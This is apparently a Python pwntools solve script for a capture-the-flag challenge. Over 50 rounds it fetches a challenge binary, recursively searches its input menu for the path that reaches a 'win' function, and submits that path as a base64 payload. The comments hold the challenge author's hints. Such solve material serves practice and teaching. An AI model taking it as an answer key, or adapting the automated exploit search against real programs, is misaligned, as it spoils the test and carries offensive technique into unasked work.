from pwn import *

BIN_PATH = "code.bin"


def get_binary(io):
    io.recvuntil(b"----------------")
    b64_binary = io.recvuntil(b"----------------", drop=True)
    with open(BIN_PATH, "wb") as f:
        f.write(base64.b64decode(b64_binary))

# Solution
# It doesn't always yield a result on some edge cases, but the error rate is quite low


def explore(path: list[bytes], explored: set[bytes]):
    print(path)

    with process(["./code.bin"]) as io:
        for item in path:
            io.sendline(item)
        io.recvlines(len(path))

        line = io.recvline(False, timeout=.2)
        if not line:
            # there's a sneaky function that call fgets()
            return
        if b"cat: /tmp/" in line:
            # got it :D
            return path

    options = line[7:-1].split(b" or ")

    for option in options:
        if option not in explored:
            explored.add(option)

            res = explore(path + [option], explored)
            if res:
                return res


def main():
    io = remote("lazy-gambler-pwner.chal.idek.team", 1337)
    for i in range(50):
        print(f"Level: {i + 1}")

        get_binary(io)

        # You now have "./code.bin" which is the vulnerable, good luck!
        #
        # Some tips:
        # - The way I check if the exploit was successful requires for the binary to *NOT*
        #   crash due to segfault & co.
        #
        # - My solve takes around 5 to 10 seconds per binaries on your average computer.
        #   If yours takes much longer, you may not be on the right path...
        #
        # - The vulnerable functions and the win functions changes a bit as to not make it
        #   *too* easy to discover, but they are still fairly straightforward. My solve
        #   has 10 to 20 lines for each. Don't overengineer!
        #
        # - There are some edge cases you may not have expected (I didn't either, but they
        #   were fun enough to be kept lol), so do take time to debug and figure out
        #   everything properly if your solve fail!
        #
        # - If you are confident the issue is on remote and not your script... Triple check!
        #   If it still persist, open a ticket and I'll do my best to figure out if it is
        #   on my side or not, and fix if needed.
        #

        path = explore([], set())
        print(path)

        payload = b"\n".join(path) + b"\n"

        b64_payload = base64.b64encode(payload)
        io.sendlineafter(b"solution:\n", b64_payload)
        log.success(f"Challenge {i+1} solved!")

    io.interactive()


main()
